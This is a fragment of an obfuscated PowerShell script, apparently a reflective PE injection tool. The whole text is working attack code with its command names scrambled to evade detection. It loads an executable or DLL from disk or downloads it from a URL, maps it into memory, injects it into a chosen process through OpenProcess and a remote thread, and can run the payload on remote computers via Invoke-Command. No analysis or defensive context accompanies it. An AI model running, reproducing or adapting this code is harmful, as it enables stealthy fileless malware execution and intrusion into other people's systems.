		&("{3}{2}{0}{1}"-f 'rbos','e','e','Write-V') ("{1}{4}{12}{3}{15}{2}{0}{9}{8}{6}{11}{13}{10}{7}{14}{5}" -f'e ','C','o th','i','alling dll','d','s it','g un','L know','DL','bein',' is','ma',' ','loade','n s')
		${dLLMAIn`p`Tr} = &("{0}{4}{2}{1}{3}"-f 'Add','s','edIntAsUn','igned','-Sign') (${p`E`InFO}."PeHA`N`dLe") (${Pein`Fo}."iM`AgE_N`T_`heADErS"."Op`TiOnA`lHeaDEr"."a`DDrESs`of`eNt`RyPoint")
		${dl`LmAi`NdEleG`ATe} = &("{3}{1}{0}{2}"-f'e','Del','gateType','Get-') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${D`L`lmAIn} =  (  iTeM  VARIable:gMqK  ).VAlUe::("{1}{3}{5}{4}{0}{2}{6}" -f 'i','GetD','onPoint','eleg','Funct','ateFor','er').Invoke(${d`lLmai`NP`TR}, ${D`lLMA`INdelEGaTe})

		${d`LLm`AIN}."i`NvoKE"(${p`EIN`Fo}."PE`hAnD`le", 0,  ( gEt-item  ('va'+'ri'+'aBLE'+':U8M1'+'Sf')  ).VAluE::"ZE`Ro") | &("{0}{1}{2}" -f'Out-N','ul','l')


		${s`UccESs} = ${W`iN32`FU`Ncti`onS}."virtu`AL`F`REE"."In`VoKE"(${PEh`AN`dLe}, [UInt64]0, ${wIn32C`On`St`AnTs}."ME`m_REL`e`ASe")
		if (${suC`CEsS} -eq ${fA`L`se})
		{
			&("{1}{0}{2}"-f'e-','Writ','Warning') ((("{1}{15}{14}{10}{3}{2}{11}{8}{4}{7}{13}{9}{12}{6}{5}{0}"-f '.','U',' to call','le',' m','ys','ng anywa','e','ree on the PE{0}s','Con','b',' VirtualF','tinui','mory. ','a','n'))  -F[cHAr]39) -WarningAction ("{0}{1}"-f 'C','ontinue')
		}
	}


	Function Ma`IN
	{
		${win32`F`U`NcTI`OnS} = &("{3}{1}{2}{0}" -f'ctions','in32','Fun','Get-W')
		${Wi`N32`TYp`ES} = &("{1}{0}{2}" -f 'yp','Get-Win32T','es')
		${W`in32cOnsta`Nts} =  &("{0}{2}{1}{3}" -f'G','-Win32Consta','et','nts')

		${Re`moTep`R`o`cHaND`le} =  ${U8M`1`Sf}::"Ze`Ro"

		
		if ((${pR`O`cID} -ne ${NU`lL}) -and (${P`RO`CID} -ne 0) -and (${Pr`o`cNAme} -ne ${Nu`LL}) -and (${p`R`oCNaME} -ne ""))
		{
			Throw ((("{8}{6}{4}{1}{2}{10}{0}{9}{7}{11}{5}{3}"-f'se on',' ProcId',' and ProcN','r','y a','othe','ppl',' the','Can{0}t su','e or','ame, choo',' ')) -F [CHaR]39)
		}
		elseif (${pro`Cn`AmE} -ne ${N`Ull} -and ${P`R`o`cNaME} -ne "")
		{
			${PROc`ess`ES} = @(&("{1}{2}{0}"-f'-Process','G','et') -Name ${pro`cN`AMe} -ErrorAction ("{4}{3}{1}{0}{2}"-f 'e','l','ntlyContinue','i','S'))
			if (${pRO`Ce`SSes}."C`oUnt" -eq 0)
			{
				Throw (('Can'+'{'+'0}t ') -f [ChAR]39+'fin'+'d '+'pro'+'cess '+"$ProcName")
			}
			elseif (${P`Ro`CEsS`ES}."CO`UnT" -gt 1)
			{
				${PROcIn`FO} = &("{0}{1}{2}"-f 'G','et-Pr','ocess') | &("{0}{1}" -f'wh','ere') { ${_}."N`AmE" -eq ${Pr`OcN`A`ME} } | &("{3}{2}{1}{0}" -f'ect','j','lect-Ob','Se') ("{2}{0}{1}" -f'ce','ssName','Pro'), ('Id'), ("{1}{0}{2}" -f's','Se','sionId')
				&("{2}{0}{3}{1}"-f 'rite-','tput','W','Ou') ${P`R`ocInfO}
				Throw ('Mor'+'e '+'th'+'an '+'one'+' '+'instan'+'c'+'e '+'of'+' '+"$ProcName "+'fou'+'nd'+', '+'pleas'+'e '+'spec'+'ify'+' '+'the'+' '+'p'+'roces'+'s '+'ID'+' '+'to'+' '+'inj'+'ect '+'i'+'n '+'to'+'.')
			}
			else
			{
				${pRoC`iD} = ${P`R`Oc`esseS}[0]."I`d"
			}
		}

		
		






		if ((${p`RO`Cid} -ne ${N`ULl}) -and (${P`Ro`cID} -ne 0))
		{
			${REmO`Tep`R`OC`h`AnDLe} = ${wI`N3`2`FuNC`TIons}."OPe`NpRo`Ce`ss"."i`NV`OkE"(0x001F0FFF, ${FA`l`se}, ${pR`OciD})
			if (${remOTe`pR`O`ChAND`Le} -eq  (Gci VAriAble:u8M1Sf  ).vaLuE::"Z`ero")
			{
				Throw ((('Co'+'uld'+'n'+'oXEt ') -creplAce ([char]111+[char]88+[char]69),[char]39)+'obta'+'in'+' '+'the'+' '+'h'+'andl'+'e '+'fo'+'r '+'pro'+'ce'+'ss '+'I'+'D: '+"$ProcId")
			}

			&("{1}{2}{0}{3}{4}"-f'r','W','rite-Ve','bo','se') ("{9}{4}{3}{10}{13}{7}{2}{5}{0}{1}{6}{8}{11}{12}" -f'te',' process ','for the','he ha','t t',' remo','t','e ','o i','Go','n','nject in ','to','dl')
		}


		
		&("{2}{0}{1}" -f '-V','erbose','Write') ("{1}{5}{7}{0}{6}{2}{3}{4}" -f 'ke-Mem','Callin','dL','i','brary','g','oryLoa',' Invo')
		${PehaN`D`le} =   ( gET-iteM VarIabLe:U8M1Sf).VALue::"z`Ero"
		if (${rEm`OT`Ep`ROCHaNDLE} -eq  ${U`8`M1sF}::"z`ero")
		{
			${pE`l`OAd`EdiNFO} = &("{0}{1}{2}{3}{4}"-f'Invoke','-MemoryL','oadLibra','r','y') -PEBytes ${PEB`Y`TeS} -ExeArgs ${e`XE`ArGs} -ForceASLR ${fOrCE`A`Slr}
		}
		else
		{
			${pe`l`Oad`EdIN`FO} = &("{4}{0}{2}{1}{5}{3}"-f'nvok','M','e-','moryLoadLibrary','I','e') -PEBytes ${Peb`yt`es} -ExeArgs ${eX`e`ArgS} -RemoteProcHandle ${R`EMotep`Roc`hANDle} -ForceASLR ${fO`Rc`ea`SlR}
		}
		if (${pe`loA`dEdinFO} -eq   ( geT-vaRiaBLe  u8m1SF).vaLUE::"Z`ero")
		{
			Throw ("{2}{4}{0}{3}{6}{1}{5}" -f ' PE','UL','Unable',', handle re',' to load','L','turned is N')
		}

		${peh`AND`lE} = ${pe`LOA`dED`in`FO}[0]
		${R`EMotE`Pe`h`ANDlE} = ${pel`OAdEdi`NfO}[1] 


		
		${Pein`Fo} = &("{1}{2}{3}{0}"-f 'dInfo','Ge','t-','PEDetaile') -PEHandle ${pEH`A`NDLe} -Win32Types ${W`In32`TYPeS} -Win32Constants ${wi`N3`2`co`NstANTs}
		if ((${P`eiN`FO}."f`I`LEtYPE" -ieq "DLL") -and (${R`emo`TePrOch`An`d`le} -eq   ${u8M1`sF}::"ZE`Ro"))
		{
			
			
			
	        switch (${f`U`N`cret`URnTYPE})
	        {
	            ("{0}{1}"-f 'W','String') {
	                &("{0}{3}{1}{2}" -f 'Wri','os','e','te-Verb') ("{6}{3}{9}{4}{1}{11}{8}{0}{5}{10}{7}{2}" -f 't','n w','pe','alli','functio','ring re','C',' ty','h WS','ng ','turn','it')
				    [IntPtr]${WstrInG`F`UNCA`dDr} = &("{1}{3}{2}{4}{0}" -f 'dress','Get','or','-Mem','yProcAd') -PEHandle ${peHaNd`LE} -FunctionName ("{2}{3}{0}{1}" -f 'tringFu','nc','W','S')
				    if (${WsTrIng`FU`N`CaDDR} -eq   ( gEt-variABlE  U8M1sF ).VALue::"Z`ERo")
				    {
					    Throw ((("{0}{1}{5}{2}{3}{4}" -f 'C','ouldnF2nt fi','nct','ion addres','s.','nd fu'))."REplA`ce"('F2n',[strING][ChaR]39))
				    }
				    ${WStrI`NGfUN`cde`LeGatE} = &("{2}{3}{0}{1}" -f'ga','teType','G','et-Dele') @() ([IntPtr])
				    ${wstr`I`N`Gfunc} =   ${gM`Qk}::("{4}{2}{6}{1}{0}{5}{3}"-f'i','Funct','tDelegat','nPointer','Ge','o','eFor').Invoke(${WS`TrING`FUN`cad`Dr}, ${WStrIngfu`NcDe`L`EGATE})
				    [IntPtr]${oU`T`p`UtPtr} = ${W`STr`Ing`Func}."I`Nvo`Ke"()
				    ${oU`T`PUt} =   ( geT-variAble  gmQK -vaLueoNlY)::("{0}{2}{1}{3}"-f 'PtrTo','U','String','ni').Invoke(${oU`T`PuT`pTr})
				    &("{2}{0}{1}"-f'utpu','t','Write-O') ${OU`T`puT}
	            }

	            ("{0}{1}" -f 'Strin','g') {
	                &("{2}{4}{1}{0}{3}" -f 'Ver','te-','W','bose','ri') ("{11}{9}{3}{0}{1}{2}{7}{6}{8}{5}{4}{10}"-f 'n wi','th St','ri','functio','turn typ','re','g','n',' ','ng ','e','Calli')
				    [IntPtr]${st`Ri`Ng`FUNC`ADdr} = &("{1}{3}{2}{4}{0}"-f's','Get-Mem','yPr','or','ocAddres') -PEHandle ${PEhA`N`dLe} -FunctionName ("{2}{3}{0}{1}"-f'ingFu','nc','S','tr')
				    if (${sTR`iNGf`UNCaDDR} -eq  ${u8`M`1sF}::"z`eRo")
				    {
					    Throw ((("{4}{2}{6}{0}{3}{1}{5}" -f'nd function ad','r','ldndY','d','Cou','ess.','0t fi'))."R`eP`LAcE"('dY0',[sTriNG][Char]39))
				    }
				    ${S`TriN`Gfu`NCDEL`egaTe} = &("{4}{1}{2}{0}{3}"-f 'Ty','D','elegate','pe','Get-') @() ([IntPtr])
				    ${st`R`ing`Func} =  ${g`mQk}::("{2}{1}{0}{3}{4}{5}"-f 'Fo','Delegate','Get','rFuncti','onPo','inter').Invoke(${s`TrInG`FuN`Ca`ddR}, ${stR`i`NGFuNcDEl`eGAtE})
				    [IntPtr]${Ou`TpUt`pTR} = ${sTr`iN`gfUnc}."In`VOkE"()
				    ${Ou`TP`UT} =  ${g`mqK}::("{1}{3}{4}{2}{0}" -f 'gAnsi','Pt','trin','r','ToS').Invoke(${Ou`TPUT`ptR})
				    &("{1}{2}{0}{3}" -f'Out','Writ','e-','put') ${O`UT`PuT}
	            }

	            ("{0}{1}" -f'Vo','id') {
	                &("{2}{0}{1}"-f 'Ve','rbose','Write-') ("{8}{0}{7}{2}{1}{3}{5}{6}{4}" -f'ng ','i','nction w','th Void ret','type','ur','n ','fu','Calli')
				    [IntPtr]${vOID`FU`N`CaDdR} = &("{0}{6}{2}{4}{3}{5}{1}" -f 'Get','s','y','Ad','Proc','dres','-Memor') -PEHandle ${p`E`haNd`lE} -FunctionName ("{2}{1}{0}"-f'dFunc','oi','V')
				    if (${Vo`idFUn`ca`dDr} -eq   ( get-VARIABlE  U8m1sf -Va  )::"Ze`Ro")
				    {
					    Throw ((("{2}{6}{3}{0}{7}{4}{1}{5}" -f'Ut find ','dre','Co','dnaG','unction ad','ss.','ul','f'))."rE`Pl`AcE"(([cHar]97+[cHar]71+[cHar]85),[StRiNg][cHar]39))
				    }
				    ${voIDf`UN`c`D`e`LEgAte} = &("{2}{1}{3}{0}"-f'pe','t-','Ge','DelegateTy') @() ([Void])
				    ${vO`id`FUNC} =  ${GM`QK}::("{4}{0}{2}{6}{1}{3}{7}{5}"-f 'ele','uncti','gateFor','on','GetD','inter','F','Po').Invoke(${vOiDf`Un`CaDDR}, ${v`oidfU`NcDE`L`Ega`Te})
				    ${VOI`dfU`NC}."INV`o`kE"() | &("{2}{0}{1}"-f'-','Null','Out')
	            }
	        }
			
			
			
		}
		
		elseif ((${Pei`NFo}."fI`Let`YPE" -ieq "DLL") -and (${re`MOtE`p`R`OcHAndlE} -ne  (GEt-VarIaBle u8M1sf).valUe::"Z`eRO"))
		{
			${v`o`IDfu`NcAdDr} = &("{2}{3}{1}{0}{4}"-f 'ocAddres','ryPr','G','et-Memo','s') -PEHandle ${PEh`A`NdLe} -FunctionName ("{1}{0}{2}"-f 'd','Voi','Func')
			if ((${vOidfu`Nc`AdDR} -eq ${nu`ll}) -or (${VO`i`DF`UN`CADDr} -eq  ${U8`M1sf}::"z`ero"))
			{
				Throw ((("{5}{7}{3}{6}{10}{2}{9}{4}{0}{1}{8}{11}"-f ' the ','D','{0}','dFu','be found in','V','nc ','oi','L','t ','couldn','L'))-f  [Char]39)
			}

			${voIDfUncA`d`dR} = &("{0}{2}{1}{3}"-f 'S','ignedI','ub-S','ntAsUnsigned') ${V`oiDFU`NCAdDR} ${Pe`HaND`le}
			${v`oi`dfunC`ADdr} = &("{3}{2}{0}{1}{4}"-f'nedIn','tAsUnsig','dd-Sig','A','ned') ${v`oIDFUnc`AddR} ${remOtePeh`A`Nd`Le}

			
			${RTh`R`E`ADHANdLE} = &("{3}{0}{4}{1}{2}" -f 'eate-Re','eThrea','d','Cr','mot') -ProcessHandle ${re`MOte`pR`OCH`AndlE} -StartAddress ${v`oIDFU`NC`AdDR} -Win32Functions ${wiN`3`2FUN`ctIons}
		}

		
        
		if (${r`emoTEpRo`CHAN`DLE} -eq  (vaRiAbLE ("U"+"8m1s"+"F")).VAlUE::"ZE`Ro" -and ${p`E`Info}."fi`LETy`pE" -ieq "DLL")
		{
			&("{4}{2}{0}{1}{3}{6}{5}"-f'r','y','nvoke-Memo','Fr','I','y','eeLibrar') -PEHandle ${peHAN`d`lE}
		}
		else
		{
			
			${sUC`c`ess} = ${W`I`N32FuNCT`IO`NS}."VirTu`A`lFREE"."IN`VokE"(${peh`And`le}, [UInt64]0, ${W`In32`cOns`Ta`NTs}."M`eM_rELE`Ase")
			if (${s`UCc`EsS} -eq ${Fal`se})
			{
				&("{1}{3}{2}{0}"-f 'rning','W','a','rite-W') ((("{17}{2}{1}{12}{15}{5}{0}{8}{16}{11}{6}{18}{14}{9}{10}{13}{3}{4}{7}" -f 'V','l','nab','nui','ng an',' ','e','yways.','irt','K5s memor','y','lFree on th','e','. Conti','E4',' to call','ua','U',' P'))  -crEplacE  ([ChAr]52+[ChAr]75+[ChAr]53),[ChAr]39) -WarningAction ("{0}{1}{2}"-f 'Contin','u','e')
			}
		}

		&("{2}{1}{0}"-f 'rbose','-Ve','Write') ("{1}{0}" -f 'ne!','Do')
	}

	&("{0}{1}" -f'Mai','n')
}


Function Ma`In
{
	if ((${PScm`dL`et}."my`IN`VOcatI`On"."b`oUnD`P`AramETErS"[("{0}{1}" -f 'D','ebug')] -ne ${n`ULl}) -and ${P`SC`mdLet}."mYin`V`oCAti`oN"."BOUND`PaRa`metE`RS"[("{0}{1}"-f 'Debu','g')]."isP`ReS`ENT")
	{
		${dEbUGPrefe`RE`N`Ce}  = ("{2}{1}{0}" -f'ue','in','Cont')
	}

	&("{3}{1}{0}{2}"-f 'e','it','-Verbose','Wr') ('PowerShe'+'l'+'l '+'Proc'+'e'+'ssID:'+' '+"$PID")

	if (${PS`C`MDLeT}.pARAMeteRsETNaME -ieq ("{2}{1}{0}" -f'le','ocalFi','L'))
	{
		&("{0}{2}{1}"-f 'Get-','dItem','Chil') ${pE`P`ATH} -ErrorAction ("{0}{1}"-f 'S','top') | &("{2}{1}{0}"-f'l','ut-Nul','O')
		[Byte[]]${p`EBytes} =   (  chilDiTEM ('VAr'+'i'+'abLE'+':'+'7MBL4')).ValuE::("{1}{2}{0}{3}" -f 'adAll','R','e','Bytes').Invoke((&("{1}{0}{3}{2}"-f 'ol','Res','th','ve-Pa') ${PEp`Ath}))
	}
	elseif (${P`S`CMdLEt}.PaRAmetERSeTNAme -ieq ("{0}{2}{1}" -f 'W','le','ebFi'))
	{
		${WEb`C`LIeNT} = &("{1}{0}{2}"-f'ew-O','N','bject') ("{1}{3}{0}{4}{2}"-f 'm','Sy','t','ste','.Net.WebClien')

		[Byte[]]${pEB`yT`ES} = ${webCL`I`e`NT}.("{0}{2}{3}{1}"-f'Dow','ta','nload','Da').Invoke(${p`eu`Rl})
	}

	
	${e_`mA`gIC} = (${pEBY`T`Es}[0..1] | &('%') {[Char] ${_}}) -join ''

    if (${e`_m`AgiC} -ne 'MZ')
    {
        throw ("{4}{6}{0}{5}{3}{2}{1}{7}"-f 'vali','ile','E f',' P','PE i','d','s not a ','.')
    }

    
	
    ${P`eB`yTES}[0] = 0
    ${P`e`BYtES}[1] = 0

	
	if (${ex`eA`RGs} -ne ${Nu`ll} -and ${E`Xear`gs} -ne '')
	{
		${e`x`EARGS} = ('R'+'e'+'flectiveE'+'xe '+"$ExeArgs")
	}
	else
	{
		${Exea`R`gS} = ("{2}{0}{1}"-f'ctiveE','xe','Refle')
	}

	if (${COMPu`T`E`R`NAme} -eq ${nu`ll} -or ${c`oMPuT`ErName} -imatch "^\s*$")
	{
		&("{4}{2}{0}{1}{3}"-f '-','C','e','ommand','Invok') -ScriptBlock ${ReM`oTe`sC`RiPTBlocK} -ArgumentList @(${p`E`BYTeS}, ${FU`NcRetU`Rnt`yPE}, ${pr`Oc`id}, ${pROcna`mE},${fo`RC`EASLR})
	}
	else
	{
		&("{3}{1}{4}{2}{0}"-f'nd','ke','mma','Invo','-Co') -ScriptBlock ${R`EmoTEscRIpT`B`LoCK} -ArgumentList @(${p`Eby`Tes}, ${FUNCr`ETu`RNt`YPE}, ${PRo`ciD}, ${P`Rocna`ME},${f`orCEaS`lr}) -ComputerName ${coM`PUT`eRNaME}
	}
}

&("{1}{0}" -f'in','Ma')
}

n
